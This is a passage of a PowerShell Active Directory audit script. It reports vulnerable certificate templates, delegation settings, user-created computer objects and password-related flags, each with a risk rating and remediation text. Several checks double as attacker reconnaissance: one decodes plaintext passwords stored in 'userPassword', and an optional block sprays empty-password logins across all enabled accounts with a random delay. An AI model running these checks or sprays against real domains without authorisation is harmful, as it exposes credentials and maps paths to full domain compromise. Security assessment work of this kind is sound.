				$VulnCertUsersRights = $VulnCertUsers | Where-Object {($_.ActiveDirectoryRights -match "WriteDacl") -or ($_.ActiveDirectoryRights -match "WriteOwner")}
				foreach ($vulncertuser in $VulnCertUsersRights) {
					$TempVulnCertUsers += [PSCustomObject]@{
						"Cert Template" = $vulncertuser.ObjectDN.Split(',')[0] -replace 'CN='
						"Identity" = "Domain Users"
						"Active Directory Rights" = "WriteDacl or WriteOwner"
						"Domain" = $AllDomain
					}
				}
			}
		}

  		$VulnCertTemplatesFlags | Format-Table -AutoSize -Wrap
		$TempVulnCertComputers | Format-Table -AutoSize -Wrap
		$TempVulnCertUsers | Format-Table -AutoSize -Wrap

		
		if ($VulnCertTemplatesFlags) {
			$HTMLVulnCertTemplates = $VulnCertTemplatesFlags | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"
			$HTMLVulnCertComputers = $TempVulnCertComputers | ConvertTo-Html -Fragment
			$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment
		}
		
		elseif ($TempVulnCertComputers) {
			$HTMLVulnCertComputers = $TempVulnCertComputers | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"
			$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment
		}
		
		elseif ($TempVulnCertUsers) {
			$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"
		}

  		if($VulnCertTemplatesFlags -OR $TempVulnCertComputers -OR $TempVulnCertUsers){
    			$CertTemplatesTable = [PSCustomObject]@{
				"Risk Rating" = "Critical - Needs Immediate Attention"
				"Description" = "These misconfigurations allow for a certificate to be requested on behalf of any domain user (including a Domain Admin), and use it to authenticate to the domain."
				"Remediation" = "Review Domain Users and Computers' Object Control and Enrollment Permissions, and Certificate Flags (ENROLLEE_SUPPLIES_SUBJECT)."
			}
			
			$HTMLCertTemplatesTable = $CertTemplatesTable | ConvertTo-Html -As List -Fragment
		}
	}


 	if($NoDelegation){}
  	else{
	
		####################################################
	    ########### Unconstrained Delegation ###############
		####################################################
		
		Write-Host ""
		Write-Host "Unconstrained Delegation:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$DCs = Get-DomainController -Domain $Domain
			$Unconstrained = Get-NetComputer -Domain $Domain -Server $Server -Unconstrained | Where-Object { $DCs.Name -notcontains $_.dnshostname }
			$TempUnconstrained = foreach ($Computer in $Unconstrained) {
				[PSCustomObject]@{
					"Name" = $Computer.samaccountname
					"Enabled" = if ($Computer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($Computer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = Resolve-DnsName -Name $Computer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Account SID" = $Computer.objectsid
					"Operating System" = $Computer.operatingsystem
					"Domain" = $Domain
				}
			}
		}
		
		else {
			$TempUnconstrained = foreach ($AllDomain in $AllDomains) {
				$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
				$DCs = Get-DomainController -Domain $AllDomain
				$Unconstrained = Get-NetComputer -Domain $AllDomain -Unconstrained | Where-Object { $DCs.Name -notcontains $_.dnshostname }
				foreach ($Computer in $Unconstrained) {
					[PSCustomObject]@{
						"Name" = $Computer.samaccountname
						"Enabled" = if ($Computer.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($Computer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = Resolve-DnsName -Name $Computer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
						"Account SID" = $Computer.objectsid
						"Operating System" = $Computer.operatingsystem
						"Domain" = $AllDomain
					}
				}
			}
		}

  		if ($TempUnconstrained) {
			$TempUnconstrained | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLUnconstrained = $TempUnconstrained | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Unconstrained Delegation</h2>"

   			$UnconstrainedTable = [PSCustomObject]@{
				"Risk Rating" = "Critical - Needs Immediate Attention"
				"Description" = "Unconstrained Delegation enables attackers to extract TGTs from memory and impersonate users or machines, leading to full domain compromise."
				"Remediation" = "Implement Constrained Delegation or Resource-Based Constrained Delegation for more secure alternatives"
			}
			
			$HTMLUnconstrainedTable = $UnconstrainedTable | ConvertTo-Html -As List -Fragment
		}
	
		
		#############################################################
	    ########### Constrained Delegation (Computers)###############
		#############################################################
	
	    Write-Host ""
		Write-Host "Constrained Delegation (Computers):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ConstrainedDelegationComputers = Get-DomainComputer -Domain $Domain -Server $Server -TrustedToAuth
			$TempConstrainedDelegationComputers = foreach ($ConstrainedDelegationComputer in $ConstrainedDelegationComputers) {
				[PSCustomObject]@{
					"Name" = $ConstrainedDelegationComputer.samaccountname
					"Enabled" = if ($ConstrainedDelegationComputer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ConstrainedDelegationComputer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = Resolve-DnsName -Name $ConstrainedDelegationComputer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Account SID" = $ConstrainedDelegationComputer.objectsid
					"Operating System" = $ConstrainedDelegationComputer.operatingsystem
					Domain = $Domain
					"msds-AllowedToDelegateTo" = $ConstrainedDelegationComputer."msds-AllowedToDelegateTo" -join " - "
				}
			}
		}
		else {
			$TempConstrainedDelegationComputers = foreach ($AllDomain in $AllDomains) {
				$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
				$ConstrainedDelegationComputers = Get-DomainComputer -Domain $AllDomain -TrustedToAuth
				foreach ($ConstrainedDelegationComputer in $ConstrainedDelegationComputers) {
					[PSCustomObject]@{
						"Name" = $ConstrainedDelegationComputer.samaccountname
						"Enabled" = if ($ConstrainedDelegationComputer.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($ConstrainedDelegationComputer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = Resolve-DnsName -Name $ConstrainedDelegationComputer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
						"Account SID" = $ConstrainedDelegationComputer.objectsid
						"Operating System" = $ConstrainedDelegationComputer.operatingsystem
						Domain = $AllDomain
						"msds-AllowedToDelegateTo" = $ConstrainedDelegationComputer."msds-AllowedToDelegateTo" -join " - "
					}
				}
			}
		}

  		if ($TempConstrainedDelegationComputers) {
			$TempConstrainedDelegationComputers | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLConstrainedDelegationComputers = $TempConstrainedDelegationComputers | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Constrained Delegation (Computers)</h2>"

   			$ConstrainedDelegationComputersTable = [PSCustomObject]@{
				"Recommendations" = "Regularly review and audit the delegation settings to ensure they align with the principle of least privilege. Limit delegation to only the necessary resources and services."
			}
			
			$HTMLConstrainedDelegationComputersTable = $ConstrainedDelegationComputersTable | ConvertTo-Html -As List -Fragment
   			$HTMLConstrainedDelegationComputersTable = $HTMLConstrainedDelegationComputersTable.Replace("*", "Recommendations")
		}
	
		
		#########################################################
	    ########### Constrained Delegation (Users)###############
		#########################################################
	
	    Write-Host ""
		Write-Host "Constrained Delegation (Users):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ConstrainedDelegationUsers = Get-DomainUser -Domain $Domain -Server $Server -TrustedToAuth
			$TempConstrainedDelegationUsers = foreach ($ConstrainedDelegationUser in $ConstrainedDelegationUsers) {
				[PSCustomObject]@{
					"Name" = $ConstrainedDelegationUser.Name
					"Enabled" = if ($ConstrainedDelegationUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ConstrainedDelegationUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($ConstrainedDelegationUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($ConstrainedDelegationUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($ConstrainedDelegationUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $ConstrainedDelegationUser.lastlogontimestamp
					"SID" = $ConstrainedDelegationUser.objectSID
					Domain = $Domain
					"msds-AllowedToDelegateTo" = $ConstrainedDelegationUser."msds-AllowedToDelegateTo" -join " - "
				}
			}
		}
		else {
			$TempConstrainedDelegationUsers = foreach ($AllDomain in $AllDomains) {
				$ConstrainedDelegationUsers = Get-DomainUser -Domain $AllDomain -TrustedToAuth
				foreach ($ConstrainedDelegationUser in $ConstrainedDelegationUsers) {
					[PSCustomObject]@{
						"Name" = $ConstrainedDelegationUser.Name
						"Enabled" = if ($ConstrainedDelegationUser.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($ConstrainedDelegationUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($ConstrainedDelegationUser.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($ConstrainedDelegationUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($ConstrainedDelegationUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $ConstrainedDelegationUser.lastlogontimestamp
						"SID" = $ConstrainedDelegationUser.objectSID
						Domain = $AllDomain
						"msds-AllowedToDelegateTo" = $ConstrainedDelegationUser."msds-AllowedToDelegateTo" -join " - "
					}
				}
			}
		}

  		if ($TempConstrainedDelegationUsers) {
			$TempConstrainedDelegationUsers | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLConstrainedDelegationUsers = $TempConstrainedDelegationUsers | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Constrained Delegation (Users)</h2>"

   			$ConstrainedDelegationUsersTable = [PSCustomObject]@{
				"Recommendations" = "Regularly review and audit the delegation settings to ensure they align with the principle of least privilege. Limit delegation to only the necessary resources and services."
			}
			
			$HTMLConstrainedDelegationUsersTable = $ConstrainedDelegationUsersTable | ConvertTo-Html -As List -Fragment
   			$HTMLConstrainedDelegationUsersTable = $HTMLConstrainedDelegationUsersTable.Replace("*", "Recommendations")
		}
	
		
		###########################################################
	    ######## Resource Based Constrained Delegation ############
		###########################################################
	    
		if($RBCD -OR $AllEnum){
	  		Write-Host ""
			Write-Host "Resource Based Constrained Delegation:" -ForegroundColor Cyan
			if ($Domain -and $Server) {
				$domainSID = Get-DomainSID $Domain -Server $Server
		
				$sidPattern = "$domainSID-[\d]{4,10}"
		
				$exclusionList = "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions"
		
				$DomainComputers = Get-DomainComputer -Domain $Domain -Server $Server -Properties distinguishedname
		
				$RBACDObjects = $DomainComputers | 
					Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | 
					Where-Object { 
						$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and 
						$_.SecurityIdentifier -match $sidPattern -and 
						$_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]) -notmatch $exclusionList 
					} | 
					ForEach-Object {
						[PSCustomObject]@{
	     						"Account" = ([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])
							"Computer Object" = ([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])
							"AD Rights" = $_.ActiveDirectoryRights
							"Object Ace Type" = $_.ObjectAceType
							Domain = "$Domain"
						}
					} |
					Group-Object "Account", "Computer Object", "AD Rights", "Domain" |
					ForEach-Object {
						[PSCustomObject]@{
							"Account" = $_.Group[0].Account
							"Computer Object" = $_.Group[0]."Computer Object"
							"AD Rights" = $_.Group[0]."AD Rights"
							"Object Ace Type" = ($_.Group | ForEach-Object { $_."Object Ace Type" }) -join ', '
							"Domain" = $_.Group[0].Domain
						}
					}
			}
			else {
				$ExcludedAccounts = "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions"
		
				$RBACDObjects = foreach ($AllDomain in $AllDomains) {
					$domainSID = Get-DomainSID $AllDomain
					$DomainComputers = Get-DomainComputer -Domain $AllDomain -Properties distinguishedname
					
					$DomainComputers | Get-DomainObjectAcl -ResolveGUIDs |
						Where-Object { 
							$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and 
							$_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" -and 
							$_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]) -notmatch $ExcludedAccounts
						} |
						ForEach-Object {
							[PSCustomObject]@{
	      							"Account" = ([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])
								"Computer Object" = ([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])
								"AD Rights" = $_.ActiveDirectoryRights
								"Object Ace Type" = $_.ObjectAceType
								Domain = $AllDomain
							}
						} |
						Group-Object "Account", "Computer Object", "AD Rights", "Domain" |
						ForEach-Object {
							[PSCustomObject]@{
								"Account" = $_.Group[0].Account
								"Computer Object" = $_.Group[0]."Computer Object"
								"AD Rights" = $_.Group[0]."AD Rights"
								"Object Ace Type" = ($_.Group | ForEach-Object { $_."Object Ace Type" }) -join ', '
								"Domain" = $_.Group[0].Domain
							}
						}
				}
			}

   			if ($RBACDObjects) {
				$RBACDObjects | Sort-Object Domain,Account,"Computer Object" | Format-Table -AutoSize -Wrap
				$HTMLRBACDObjects = $RBACDObjects | Sort-Object Domain,Account,"Computer Object" | ConvertTo-Html -Fragment -PreContent "<h2>Resource Based Constrained Delegation</h2>"

    				$RBCDTable = [PSCustomObject]@{
					"Recommendations" = "Regularly review and audit the delegation settings to ensure they align with the principle of least privilege. Limit delegation to necessary resources and services only."
				}
				
				$HTMLRBCDTable = $RBCDTable | ConvertTo-Html -As List -Fragment
    				$HTMLRBCDTable = $HTMLRBCDTable.Replace("*", "Recommendations")
			}
  		}
  	}

   	###########################################################
   	######## Computers Objects created by regular users ############
	###########################################################
    

	Write-Host ""
	Write-Host "Computers Objects created by regular users:" -ForegroundColor Cyan
	if ($Domain -and $Server) {

		$DomainComputersCreated = Get-DomainComputer -Domain $Domain -Server $Server -LDAPFilter "(ms-DS-CreatorSID=*)" -Properties samaccountname,ms-DS-CreatorSID,whenCreated,objectsid,operatingsystem,name,lastlogontimestamp

		$ADComputersCreated = foreach ($ComputerCreated in $DomainComputersCreated) {
			
			$ComputerCreator = $null
			try {
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try{
						$ComputerCreator = ConvertFrom-SID ((New-Object System.Security.Principal.SecurityIdentifier($ComputerCreated.'ms-DS-CreatorSID',0)).toString()) -Domain $PlaceHolderDomain
						if ($null -ne $ComputerCreator) { break }
					}
					catch{continue}
				}
			}
			catch {
				try{
					$ComputerCreator = [System.Security.Principal.SecurityIdentifier]::new($ComputerCreated.'ms-DS-CreatorSID').Translate([System.Security.Principal.NTAccount]).Value
				}
				catch{
					$ComputerCreator = $ComputerCreated.'ms-DS-CreatorSID'
				}
			}
		
			[PSCustomObject]@{
				Name = $ComputerCreated.samaccountname
				"Enabled" = if ($ComputerCreated.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($ComputerCreated.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = Resolve-DnsName -Name $ComputerCreated.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
				"Account SID" = $ComputerCreated.objectsid
				"Operating System" = $ComputerCreated.operatingsystem
				"Creator" = $ComputerCreator
				"Created" = $ComputerCreated.whenCreated
				Domain = "$Domain"
			}
		
		}
	}
	else {

		$ADComputersCreated = foreach ($AllDomain in $AllDomains) {
		
			$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			
			$DomainComputersCreated = Get-DomainComputer -Domain $AllDomain -LDAPFilter "(ms-DS-CreatorSID=*)" -Properties samaccountname,ms-DS-CreatorSID,whenCreated,objectsid,operatingsystem,name,lastlogontimestamp
			
			foreach ($ComputerCreated in $DomainComputersCreated) {
			
				$ComputerCreator = $null
				try {
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try{
							$ComputerCreator = ConvertFrom-SID ((New-Object System.Security.Principal.SecurityIdentifier($ComputerCreated.'ms-DS-CreatorSID',0)).toString()) -Domain $PlaceHolderDomain
							if ($null -ne $ComputerCreator) { break }
						}
						catch{continue}
					}
				}
				catch {
					try{
						$ComputerCreator = [System.Security.Principal.SecurityIdentifier]::new($ComputerCreated.'ms-DS-CreatorSID').Translate([System.Security.Principal.NTAccount]).Value
					}
					catch{
						$ComputerCreator = $ComputerCreated.'ms-DS-CreatorSID'
					}
				}
			
				[PSCustomObject]@{
					Name = $ComputerCreated.samaccountname
					"Enabled" = if ($ComputerCreated.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ComputerCreated.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = Resolve-DnsName -Name $ComputerCreated.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Account SID" = $ComputerCreated.objectsid
					"Operating System" = $ComputerCreated.operatingsystem
					"Creator" = $ComputerCreator
					"Created" = $ComputerCreated.whenCreated
					Domain = "$AllDomain"
				}
			
			}
		}
	}

	if ($ADComputersCreated) {
		$ADComputersCreated | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
		$HTMLADComputersCreated = $ADComputersCreated | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Computers Objects created by regular users</h2>"

  		$ADComputersCreatedTable = [PSCustomObject]@{
			"Recommendations" = "Review the above computer objects and consider removing any ACE that was set to allow the specific user or group to domain join the computer."
		}
		
		$HTMLADComputersCreatedTable = $ADComputersCreatedTable | ConvertTo-Html -As List -Fragment
		$HTMLADComputersCreatedTable = $HTMLADComputersCreatedTable.Replace("*", "Recommendations")
	}
	
	###############################################################
    ########### Check if any user passwords are set ###############
	###############################################################
	
	Write-Host ""
	Write-Host "Check if any user passwords are set:" -ForegroundColor Cyan
	
	if ($Domain -and $Server) {
		
		$PasswordSetUsers = Get-DomainUser -LDAPFilter '(userPassword=*)' -Domain $Domain -Server $Server | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru}
		
		$TempPasswordSetUsers = foreach($PasswordSetUser in $PasswordSetUsers){
			
			[PSCustomObject]@{
				"User Name" = $PasswordSetUser.samaccountname
				"Enabled" = if ($PasswordSetUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($PasswordSetUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($PasswordSetUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($PasswordSetUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($PasswordSetUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"User Password" = $PasswordSetUser.Password
				"Hex User Password" = ($PasswordSetUser.userPassword) -join ' '
				"Last Logon" = $PasswordSetUser.lastlogontimestamp
				"SID" = $PasswordSetUser.objectSID
				#"Groups Membership" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $PasswordSetUser.samaccountname).Name -join ' - '
				"Domain" = $Domain
			}
			
		}
	}
	
	else {
		
		$TempPasswordSetUsers = foreach ($AllDomain in $AllDomains) {
			
			$PasswordSetUsers = Get-DomainUser -LDAPFilter '(userPassword=*)' -Domain $AllDomain | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru}
		
			foreach($PasswordSetUser in $PasswordSetUsers){
				
				[PSCustomObject]@{
					"User Name" = $PasswordSetUser.samaccountname
					"Enabled" = if ($PasswordSetUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($PasswordSetUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($PasswordSetUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($PasswordSetUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($PasswordSetUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"User Password" = $PasswordSetUser.Password
					"Hex User Password" = ($PasswordSetUser.userPassword) -join ' '
					"Last Logon" = $PasswordSetUser.lastlogontimestamp
					"SID" = $PasswordSetUser.objectSID
					#"Groups Membership" = (Get-DomainGroup -Domain $AllDomain -UserName $PasswordSetUser.samaccountname).Name -join ' - '
					"Domain" = $AllDomain
				}
				
			}
			
		}
	}

 	if ($TempPasswordSetUsers) {
		$TempPasswordSetUsers | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap
		$HTMLPasswordSetUsers = $TempPasswordSetUsers | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2>Check if any user passwords are set</h2>"
		$TempPasswordSetUsers."User Password" | ForEach-Object {
			$HTMLPasswordSetUsers = $HTMLPasswordSetUsers -replace "<td>$_</td>","<td class=`"YesStatus`">$_</td>"
		}
  		$HTMLPasswordSetUsers = $HTMLPasswordSetUsers -replace '<td>YES</td>','<td class="YesStatus">YES</td>'

    		$UserPasswordsSetTable = [PSCustomObject]@{
			"Risk Rating" = "High - Needs Immediate Attention"
			"Description" = "Checks if any user passwords are set via the attribute 'userPassword'."
			"Remediation" = "Make sure this attribute does not contain a value."
		}
		
		$HTMLUserPasswordsSetTable = $UserPasswordsSetTable | ConvertTo-Html -As List -Fragment
	}
	
	#################################################################################################
    ########### Users with Password-not-required attribute set ###############
	#################################################################################################
	
	Write-Host ""
	Write-Host "Users with Password-not-required attribute set:" -ForegroundColor Cyan
	
	if ($Domain -and $Server) {
		
		$EmptyPasswordUsers = Get-DomainUser -UACFilter PASSWD_NOTREQD -Domain $Domain -Server $Server
		
		$TempEmptyPasswordUsers = foreach($EmptyPasswordUser in $EmptyPasswordUsers){
			
			[PSCustomObject]@{
				"User Name" = $EmptyPasswordUser.samaccountname
				"Enabled" = if ($EmptyPasswordUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($EmptyPasswordUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($EmptyPasswordUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($EmptyPasswordUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($EmptyPasswordUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $EmptyPasswordUser.lastlogontimestamp
				"SID" = $EmptyPasswordUser.objectSID
				#"Groups Membership" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $EmptyPasswordUser.samaccountname).Name -join ' - '
				"Domain" = $Domain
			}
			
		}	
	}
	
	else {
		
		$TempEmptyPasswordUsers = foreach ($AllDomain in $AllDomains) {
			
			$EmptyPasswordUsers = Get-DomainUser -UACFilter PASSWD_NOTREQD -Domain $AllDomain
		
			foreach($EmptyPasswordUser in $EmptyPasswordUsers){
				
				[PSCustomObject]@{
					"User Name" = $EmptyPasswordUser.samaccountname
					"Enabled" = if ($EmptyPasswordUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($EmptyPasswordUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($EmptyPasswordUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($EmptyPasswordUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($EmptyPasswordUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $EmptyPasswordUser.lastlogontimestamp
					"SID" = $EmptyPasswordUser.objectSID
					#"Groups Membership" = (Get-DomainGroup -Domain $AllDomain -UserName $EmptyPasswordUser.samaccountname).Name -join ' - '
					"Domain" = $AllDomain
				}
				
			}
			
		}
	}

 	if ($TempEmptyPasswordUsers) {
		$TempEmptyPasswordUsers | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap
		$HTMLEmptyPasswordUsers = $TempEmptyPasswordUsers | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users with Password-not-required attribute set</h2>"

  		$EmptyPasswordsTable = [PSCustomObject]@{
			"Risk Rating" = "High - Needs Immediate Attention"
			"Description" = "When the PASSWD_NOTREQD attribute is set on an Active Directory user object, it indicates that the user account can be created without a password."
			"Remediation" = "Disable the Password-not-required attribute for all users in the domain."
		}
		
		$HTMLEmptyPasswordsTable = $EmptyPasswordsTable | ConvertTo-Html -As List -Fragment
	}

	#################################################################################################
    ########### Users with Empty Passwords ###############
	#################################################################################################
	
	if($SprayEmptyPasswords){
 
	 	Write-Host ""
		Write-Host "Users with empty passwords:" -ForegroundColor Cyan
		
		$minDelay = 0
		$maxDelay = 200
		$delay = Get-Random -Minimum $minDelay -Maximum $maxDelay
		
		if ($Domain -and $Server) {
			
			$PotentialUsersWithEmptyPassword = @()
			$PotentialComputersWithEmptyPassword = @()
			$PotentialUsersWithEmptyPassword = Get-DomainUser -Domain $Domain -Server $Server -UACFilter NOT_ACCOUNTDISABLE | Sort-Object samaccountname
			$PotentialComputersWithEmptyPassword = Get-DomainComputer -Domain $Domain -Server $Server -UACFilter NOT_ACCOUNTDISABLE | Sort-Object samaccountname
			$TotalPotentialEmptyPass = New-Object System.Collections.ArrayList
			$null = $TotalPotentialEmptyPass.AddRange($PotentialUsersWithEmptyPassword)
			$null = $TotalPotentialEmptyPass.AddRange($PotentialComputersWithEmptyPassword)
			
			Add-Type -AssemblyName "System.DirectoryServices.AccountManagement"
			$principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $Server, $Domain)
			
			$TempTotalEmptyPass = foreach($EmptyPasswordUser in $TotalPotentialEmptyPass){
			
				$EmptyPasswordUserName = $EmptyPasswordUser.samaccountname
				
				$EmptyCheck = $principalContext.ValidateCredentials("$EmptyPasswordUserName", "", 1)
				
				if ($EmptyCheck.name -ne $null){
				
					[PSCustomObject]@{
						"User Name" = $EmptyPasswordUser.samaccountname
						"Enabled" = if ($EmptyPasswordUser.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($EmptyPasswordUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
